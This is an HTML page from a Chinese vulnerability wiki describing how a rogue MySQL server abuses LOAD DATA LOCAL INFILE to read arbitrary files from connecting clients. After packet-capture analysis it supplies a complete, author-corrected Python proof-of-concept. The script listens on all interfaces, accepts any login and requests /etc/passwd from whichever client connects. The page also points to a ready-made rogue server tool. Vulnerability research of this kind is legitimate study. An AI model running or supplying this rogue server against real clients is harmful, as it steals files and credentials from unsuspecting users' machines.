<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>MySQL LOAD DATA 读取客户端任意文件 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "MySQL LOAD DATA \u8bfb\u53d6\u5ba2\u6237\u7aef\u4efb\u610f\u6587\u4ef6", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2012-2122/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2012-2122/" class="btn btn-xs btn-link">
        MySQL Authentication Bypass (CVE-2012-2122)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../MyBB/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%20%26%20CVE-2021-27889%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../MyBB/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%20%26%20CVE-2021-27889%29/" class="btn btn-xs btn-link">
        Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889)
      </a>
    </div>
    
  </div>

    

    <h1 id="mysql-load-data">MySQL LOAD DATA 读取客户端任意文件<a class="headerlink" href="#mysql-load-data" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h3 id="load-data-infile">LOAD DATA INFILE<a class="headerlink" href="#load-data-infile" title="Permanent link">&para;</a></h3>
<p>mysql的LOAD DATA
INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是：</p>
<div class="codehilite"><pre><span></span><code><span class="nb">load</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&quot;/etc/passwd&quot;</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">table</span><span class="w"> </span><span class="n">TestTable</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="s1">&#39;分隔符&#39;</span><span class="p">;</span>
<span class="nb">load</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&quot;/etc/passwd&quot;</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">table</span><span class="w"> </span><span class="n">TestTable</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="s1">&#39;分隔符&#39;</span><span class="p">;</span>
</code></pre></div>

<p>第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD
DATA LOCAL INFILE。官方文档中也提出了这个问题（PS：Google翻译的不是很准确）</p>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId23.png" /></p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">分析数据包<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>测试环境：MacOS 10.14Mysql 5.7.21</p>
<p>使用tcpdump抓取3306端口的数据包</p>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId27.png" /></p>
<h4 id="1greetingbanner">1.服务器向客户端发送greeting问候包，包含服务端banner信息<a class="headerlink" href="#1greetingbanner" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId29.png" /></p>
<h4 id="2load-data-localbanner">2.客户端发送登陆请求包，包含用户名密码，以及含有LOAD DATA LOCAL选项的客户端banner信息。<a class="headerlink" href="#2load-data-localbanner" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId31.png" /></p>
<h4 id="3select-database-select-version_comment">3.然后是客户端初始化的一些查询，比如select database(); select @\@version_comment;<a class="headerlink" href="#3select-database-select-version_comment" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId33.png" /></p>
<h4 id="4load-data-infilerequest-que">4.找到我们执行的LOAD DATA INFILE数据包，第一个包看起来比较正常，是客户端发起的Request Que<a class="headerlink" href="#4load-data-infilerequest-que" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId35.png" /></p>
<h4 id="5load-data-infileuserssmi1edesktoptesttxt">5.但是紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/Users/smi1e/Desktop/test.txt的数据包。<a class="headerlink" href="#5load-data-infileuserssmi1edesktoptesttxt" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId37.png" /></p>
<h4 id="6userssmi1edesktoptesttxt">6.然后客户端向服务端发送了/Users/smi1e/Desktop/test.txt文件的内容：<a class="headerlink" href="#6userssmi1edesktoptesttxt" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId39.png" /></p>
<p>如果我们在客户端发送查询之后，返回一个Response
TABULAR数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的
In theory, a patched server could be built that would tell the client
program to transfer a file of the server\'s choosing rather than the
file named by the client in the <a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html">LOAD
DATA</a>
statement.也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。</p>
<p>最重要的是伪造的服务端可以在任何时候回复一个file-transfer
请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use
LOAD DATA
LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。</p>
<h3 id="mysql">搭建MySQL服务端<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h3>
<p>主要分为</p>
<ul>
<li>向 MySQL Client 发送Server Greeting</li>
<li>等待 Client 端发送一个Query Package</li>
<li>回复一个file transfer请求</li>
</ul>
<p>我们需要知道如何构造File Transfer和Server
Greeting数据包，这些包的格式都可以在 MySQL 的官方文档上找到。</p>
<p>File Transfer数据包格式：Protocol::LOCAL_INFILE_Request</p>
<p>并且我们需要等待一个来自 Client
的查询请求，才能回复这个读文件的请求。不过我们在上面看到客户端在连接成功后会自动的做一些初始化的查询。</p>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId42.png" /></p>
<p>官方也给了exmaple</p>
<div class="codehilite"><pre><span></span><code><span class="mf">0</span><span class="n">c</span><span class="w"> </span><span class="mf">00</span><span class="w"> </span><span class="mf">00</span><span class="w"> </span><span class="mf">01</span><span class="w"> </span><span class="n">fb</span><span class="w"> </span><span class="mf">2</span><span class="n">f</span><span class="w"> </span><span class="mf">65</span><span class="w"> </span><span class="mf">74</span><span class="w">    </span><span class="mf">63</span><span class="w"> </span><span class="mf">2</span><span class="n">f</span><span class="w"> </span><span class="mf">70</span><span class="w"> </span><span class="mf">61</span><span class="w"> </span><span class="mf">73</span><span class="w"> </span><span class="mf">73</span><span class="w"> </span><span class="mf">77</span><span class="w"> </span><span class="mf">64</span><span class="w">    </span><span class="mf">.....</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
</code></pre></div>

<p>数据包的内容其实是从\xfb开始的，这个字节代表包的类型，后面紧跟要读取的文件名。前面的0x0c是数据包的长度（从
\xfb 开始计算），长度后面的三个字节\x00\x00\x01是数据包的序号。</p>
<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId43.png" /></p>
<p>Greeting数据包格式：官方文档，如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。</p>
<p>这里直接拷贝大佬归纳的格式。</p>
<div class="codehilite"><pre><span></span><code>&#39;\x0a&#39;,  # Protocol
&#39;6.6.6-lightless_Mysql_Server&#39; + &#39;\0&#39;,  # Version
&#39;\x36\x00\x00\x00&#39;,  # Thread ID
&#39;ABCDABCD&#39; + &#39;\0&#39;,  # Salt
&#39;\xff\xf7&#39;,  # Capabilities, CLOSE SSL HERE!
&#39;\x08&#39;,  # Collation
&#39;\x02\x00&#39;,  # Server Status
&quot;\x0f\x80\x15&quot;, 
&#39;\0&#39; * 10,  # Unknown
&#39;ABCDABCD&#39; + &#39;\0&#39;,
&quot;mysql_native_password&quot; + &quot;\0&quot;
</code></pre></div>

<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<p>来源于https://<a href="http://www.vesiluoma.com/abusing-mysql-clients/的POC">www.vesiluoma.com/abusing-mysql-clients/的POC</a>，测了一个多小时都没成功，最后发现里面
#3payload写错了，我给改了下。</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1">#coding: utf8</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>

<span class="c1"># linux :</span>
<span class="c1">#filestring = &quot;/etc/passwd&quot;</span>
<span class="c1"># windows:</span>
<span class="c1">#filestring = &quot;C:\Windows\system32\drivers\etc\hosts&quot;</span>
<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;0.0.0.0&quot;</span> <span class="c1"># open for eeeeveryone! ^_^</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">3306</span>
<span class="n">BUFFER_SIZE</span> <span class="o">=</span> <span class="mi">1024</span>

<span class="c1">#1 Greeting</span>
<span class="n">greeting</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00</span><span class="s2">&quot;</span>
<span class="c1">#2 Accept all authentications</span>
<span class="n">authok</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00</span><span class="s2">&quot;</span>

<span class="c1">#3 Payload</span>
<span class="c1">#数据包长度</span>
<span class="n">payloadlen</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x0c</span><span class="s2">&quot;</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00\x00</span><span class="s2">&quot;</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payloadlen</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span>  <span class="s2">&quot;</span><span class="se">\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64</span><span class="s2">&quot;</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>

    <span class="nb">print</span> <span class="s1">&#39;Connection from:&#39;</span><span class="p">,</span> <span class="n">addr</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">greeting</span><span class="p">)</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">)</span>
        <span class="nb">print</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%02x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">authok</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="nb">print</span> <span class="s2">&quot;[*] Payload send!&quot;</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span> <span class="k">break</span>
        <span class="nb">print</span> <span class="s2">&quot;Data received:&quot;</span><span class="p">,</span> <span class="n">data</span>
        <span class="k">break</span>
    <span class="c1"># Don&#39;t leave the connection open.</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>

<p><img alt="" src="../resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId45.png" /></p>
<p>ps: 实测 下面这个项目比较好用，上面的poc还需要改长度和内容的16进制值Github还有一个项目：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
<p>该特性适用于：MySQL Client、 PHP with mysqli、Python with
MySQLdb、Python3 with mysqlclient、Java with JDBC Driver等。</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2012-2122/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2012-2122/" class="btn btn-xs btn-link">
        MySQL Authentication Bypass (CVE-2012-2122)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../MyBB/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%20%26%20CVE-2021-27889%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../MyBB/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%20%26%20CVE-2021-27889%29/" class="btn btn-xs btn-link">
        Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>